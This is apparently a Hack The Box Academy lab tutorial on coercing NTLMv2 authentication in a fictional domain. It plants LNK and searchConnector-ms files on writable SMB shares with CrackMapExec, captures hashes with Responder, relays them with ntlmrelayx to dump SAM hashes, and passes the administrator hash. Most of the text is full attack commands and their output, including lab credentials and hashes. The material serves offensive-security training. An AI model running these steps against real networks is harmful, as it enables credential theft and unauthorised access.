# Stealing Hashes

One of the most common techniques for compromising new accounts is the theft of password hashes. There are different methods of achieving this, but a widespread one is forcing a computer or user to initiate an authentication process with a fake shared folder we control.

When starting this authentication process, the user or computer does it with an NTLMv2 hash. This hash could be cracked using a tool such as Hashcat or forwarded to another computer to impersonate the user without knowing their credentials.

To steal hashes using shared folders, we can create a shortcut and configure it so that the icon that appears in the shortcut points to our fake shared folder. Once the user enters the shared folder, it will try to look for the icon's location, forcing the authentication against our shared folder.

To learn more about harvesting NTLMv2 hashes, we can read the blog [Farming for Red Teams: Harvesting NetNTLM from MDsec](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/) which shows not only the use of shortcuts but also other types of files that serve the same purpose.

***

## Slinky Module

`Slinky` is a module created by [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) and by far one of the most exciting modules on CME. The principle is straightforward. The module creates Windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions. When someone visits the share, we will get their NTLMv2 hash using Responder because the icon attribute contains a UNC path to our server.

The module has two mandatory options, `SERVER` and `NAME`, and one optional `CLEANUP`.

### **Slinky Module Options**

```shell-session
$ crackmapexec smb -M slinky --options

[*] slinky module options:

        SERVER        IP of the SMB server
        NAME          LNK file nametest
        CLEANUP       Cleanup (choices: True or False)
```

`SERVER` corresponds to the IP of the SMB server we control and where we want the UNC path to point. The `NAME` option assigns a name to the shortcut file, and `CLEANUP` is to delete the shortcut once we finish.

***

## Connecting using Chisel

For this exercise, we will simulate local access and use Chisel and Proxychains to connect to the internal network. Chisel is already running as a server in our target machine, and we need to connect as a client and then use proxychains to enumerate the internal network. To connect using Chisel let's use the following command:

### **Connecting to the Target Machine Chisel Server**

```shell-session
$ sudo chisel client 10.129.204.133:8080 socks

2022/11/22 07:15:52 client: Connecting to ws://10.129.204.133:8080
2022/11/22 07:15:52 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2022/11/22 07:15:53 client: Connected (Latency 125.541725ms)
```

***

## Stealing NTLMv2 Hashes

First, let us find a share where the user `grace` has `WRITE` privileges using the option `--shares`:

### **Finding Shares with WRITE Privileges**

```shell-session
$ proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --shares

SMB         172.16.1.10     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         172.16.1.10     445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01! 
SMB         172.16.1.10     445    DC01             [+] Enumerated shares
SMB         172.16.1.10     445    DC01             Share           Permissions     Remark
SMB         172.16.1.10     445    DC01             -----           -----------     ------
SMB         172.16.1.10     445    DC01             ADMIN$                          Remote Admin
SMB         172.16.1.10     445    DC01             C$                              Default share
SMB         172.16.1.10     445    DC01             D$                              Default share
SMB         172.16.1.10     445    DC01             flag            READ            
SMB         172.16.1.10     445    DC01             HR              READ,WRITE      
SMB         172.16.1.10     445    DC01             IPC$            READ            Remote IPC
SMB         172.16.1.10     445    DC01             IT                              
SMB         172.16.1.10     445    DC01             IT-Tools        READ,WRITE      
SMB         172.16.1.10     445    DC01             NETLOGON        READ            Logon server share 
SMB         172.16.1.10     445    DC01             SYSVOL          READ            Logon server share
```

As we see, `grace` can write to the `HR` and `IT-Tools` shares. Therefore we can use the module `Slinky` to write an LNK file to each share. We will use the option `SERVER=10.10.14.33`, the IP address corresponding to our attack host's `tun0` network, and the option `NAME=important`, which is the file name we are assigning to the LNK file.

### **Using Slinky**

```shell-session
$ proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M slinky -o SERVER=10.10.14.33 NAME=important
[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y

SMB         172.16.1.10     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         172.16.1.10     445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01! 
SLINKY      172.16.1.10     445    DC01             [+] Found writable share: HR
SLINKY      172.16.1.10     445    DC01             [+] Created LNK file on the HR share
SLINKY      172.16.1.10     445    DC01             [+] Found writable share: IT-Tools
SLINKY      172.16.1.10     445    DC01             [+] Created LNK file on the IT-Tools share
```

{% embed url="https://academy.hackthebox.com/storage/modules/84/slinky-lnk-file.jpg" %}

{% hint style="info" %}
**Note:** CrackMapExec is generally considered opsec safe because everything is either run in memory, enumerated over the network using WinAPI calls, or executed using built-in Windows tools/features. We will get a prompt when a module doesn't meet these requirements. The Slinky module is an example of a not opsec safe module. We will get a prompt before proceeding.
{% endhint %}

Once the LNK file is created, we need to run `Responder` and wait for someone to browse to the share. To learn more about how to use Responder, we can check the section [Attacking SMB](https://academy.hackthebox.com/module/116/section/1167) in the [Attacking Common Services](https://academy.hackthebox.com/module/details/116/) module.

### **Starting Responder**

```shell-session
$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script, hit CTRL-C

<SNIP>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.204.133
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\julio
[SMB] NTLMv2-SSP Hash     : julio::INLANEFREIGHT:6ab02caa0926e456:433DB600379844344ED4D3A073CAF995:[SNIP]
```

{% hint style="info" %}
**Note:** The SMB option should be `On` in the `Responder.conf` file to capture the hash.
{% endhint %}

We got our NTLMv2 hash, and we need to crack it to exploit the account, or we can do an NTLM Relay. To crack it, we can use Hashcat mode `5600` just as we did with ASREPRoast and Kerberoasting. Let's focus on NTLM Relay.

***

## NTLM Relay

Another solution is to relay the NTLMv2 hash directly to other servers and workstations on the network where SMB Signing is disabled. SMB Signing is essential because if a computer has SMB Signing enabled, we can't relay to that computer because we will be unable to prove our attack host's identity. To get a list of targets with SMB Signing disabled, we can use the option `--gen-relay-list`.

Now we can use Proxychains and get a list of the machines with SMB Signing disabled.

### **Getting Relay List**

```shell-session
$ proxychains4 -q crackmapexec smb 172.16.1.0/24 --gen-relay-list relay.txt

SMB         172.16.1.5      445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
SMB         172.16.1.10     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
```

```shell-session
$ cat relay.txt 

172.16.1.5
```

We will use `ntlmrelayx` with the previous list we got from the option `--gen-relay-list`. If we find an account with local administrator privileges on the target machine, if no other options are specified, `ntlmrelayx` will automatically dump the SAM database of the target machine and we would be able to attempt to perform a pass-the-hash attack with any local admin user hashes.

### **Execute NTLMRelayX**

```shell-session
$ sudo proxychains4 -q ntlmrelayx.py -tf relay.txt -smb2support --no-http

Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections  
```

We need to wait until a user accesses the SMB share, and our LNK file forces them to connect to our target machine (this happens in the background, and the user will not notice anything out of the ordinary). Once this is done, we should see something like this in the `ntlmrelayx` console:

```shell-session
$ sudo proxychains4 -q ntlmrelayx.py -tf relay.txt -smb2support --no-http

Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

<SNIP>

[*] Servers started, waiting for connections
[*] SMBD-Thread-4: Connection from INLANEFREIGHT/JULIO@10.129.204.133 controlled, attacking target smb://172.16.1.5
[*] Authenticating against smb://172.16.1.5 as INLANEFREIGHT/JULIO SUCCEED
[*] SMBD-Thread-4: Connection from INLANEFREIGHT/JULIO@10.129.204.133 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x29fc3535fc09fb37d22dc9f3339f6875
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:30b3783ce2abf1af70f77d0660cf3453:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
localadmin:1003:aad3b435b51404eeaad3b435b51404ee:7c08d63a2f48f045971bc2236ed3f3ac:::
sshd:1004:aad3b435b51404eeaad3b435b51404ee:d24156d278dfefe29553408e826a95f6:::
htb:1006:aad3b435b51404eeaad3b435b51404ee:6593d8c034bbe9db50e4ce94b1943701:::
[*] Done dumping SAM hashes for host: 172.16.1.5
[*] Stopping service RemoteRegistry
```

Then we can use `crackmapexec` to authenticate to the target machine using the administrator hash:

### **Testing Local Accounts**

```shell-session
$ proxychains4 -q crackmapexec smb 172.16.1.5 -u administrator -H 30b3783ce2abf1af70f77d0660cf3453 --local-auth

SMB         172.16.1.5      445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
SMB         172.16.1.5      445    MS01             [+] MS01\administrator:30b3783ce2abf1af70f77d0660cf3453 (Pwn3d!)
```

***

## Cleanup Everything

When we finish with the module, cleaning up the LNK file using the option `-o CLEANUP=YES` and the name of the LNK file `NAME=important` is crucial.

### **Cleanup**

```shell-session
$ proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M slinky -o NAME=important CLEANUP=YES

[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y
SMB         172.16.1.10     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         172.16.1.10     445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01! 
SLINKY      172.16.1.10     445    DC01             [+] Found writable share: HR
SLINKY      172.16.1.10     445    DC01             [+] Deleted LNK file on the HR share
SLINKY      172.16.1.10     445    DC01             [+] Found writable share: IT-Tools
SLINKY      172.16.1.10     445    DC01             [+] Deleted LNK file on the IT-Tools share
```

## Stealing Hashes with drop-sc Module

Before concluding this section, let's look at another method of forcing authentication using a file format other than `LNK`, the [.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry) and `.library-ms` formats. Both of these file formats have default file associations on most Windows versions. They integrate with Windows to show content from an arbitrary location which can also be a remote location, by specifying a WebDAV share.

In essence, they perform the same function as the LNK file. To learn more about the discovery of this method, we can read the blog post [Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/).

CrackMapExec has a module named `drop-sc`, which allows us to create a `searchConnector-ms` file in a shared folder. To use it, we need to specify the option `URL` to target our SMB fake server. In this case, our host running `ntlmrelayx`. The `URL` needs to be escaped with double backslashes (\\), for example: `URL=\\\\10.10.14.33\\secret`.

Optionally we can specify the following options:

* The target shared folder with the option `SHARE=name`. If we don't specify this option, it will write the file in all shares with `WRITE` permissions.
* The filename with the option `FILENAME=name`. If we don't specify this option, it will create a file named "Documents."
* The option `CLEANUP=True` if we want to clean the files we created. We need to specify the filename option if we use a custom name.

Let's see `drop-sc` in action:

### **Dropping a searchConnector-ms File**

```shell-session
$ crackmapexec smb -M drop-sc --options

[*] drop-sc module options:

            Technique discovered by @DTMSecurity and @domchell to remotely coerce a host to start WebClient service.
            https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/
            Module by @zblurx
            URL         URL in the searchConnector-ms file, default https://rickroll
            CLEANUP     Cleanup (choices: True or False)
            SHARE       Specify a share to target
            FILENAME    Specify the filename used WITHOUT the extension searchConnector-ms (it's automatically added); the default is "Documents".
```

```shell-session
$ proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M drop-sc -o URL=\\\\10.10.14.33\\secret SHARE=IT-Tools FILENAME=secret

[!] Module is not opsec safe, are you sure you want to run this? [Y/n] Y
SMB         172.16.1.10     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         172.16.1.10     445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01! 
DROP-SC     172.16.1.10     445    DC01             [+] Found writable share: IT-Tools
DROP-SC     172.16.1.10     445    DC01             [+] Created secret.searchConnector-ms file on the IT-Tools share
```

Once a user accesses the shared folder, and while we have `ntlmrelayx` listening, we should also be able to relay to the target machine.

### **Relaying Using NTLMRelayx and drop-sc**

```shell-session
$ sudo proxychains4 -q ntlmrelayx.py -tf relay.txt -smb2support --no-http

Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

<SNIP>

[*] Servers started, waiting for connections
[*] SMBD-Thread-4: Connection from INLANEFREIGHT/JULIO@10.129.204.133 controlled, attacking target smb://172.16.1.5
[*] Authenticating against smb://172.16.1.5 as INLANEFREIGHT/JULIO SUCCEED
[*] SMBD-Thread-4: Connection from INLANEFREIGHT/JULIO@10.129.204.133 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x29fc3535fc09fb37d22dc9f3339f6875
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:30b3783ce2abf1af70f77d0660cf3453:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
localadmin:1003:aad3b435b51404eeaad3b435b51404ee:7c08d63a2f48f045971bc2236ed3f3ac:::
sshd:1004:aad3b435b51404eeaad3b435b51404ee:d24156d278dfefe29553408e826a95f6:::
htb:1006:aad3b435b51404eeaad3b435b51404ee:6593d8c034bbe9db50e4ce94b1943701:::
[*] Done dumping SAM hashes for host: 172.16.1.5
[*] Stopping service RemoteRegistry
```

Finally, we can clean up the `.searchConnector-ms` file with the `CLEANUP=True` option:

### **Cleaning Up searchConnector-ms Files**

```shell-session
$ proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M drop-sc -o CLEANUP=True FILENAME=secret

[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y
SMB         172.16.1.10     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         172.16.1.10     445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01!
DROP-SC     172.16.1.10     445    DC01             [+] Found writable share: IT-Tools
DROP-SC     172.16.1.10     445    DC01             [+] Deleted secret.searchConnector-ms file on the IT-Tools share
```
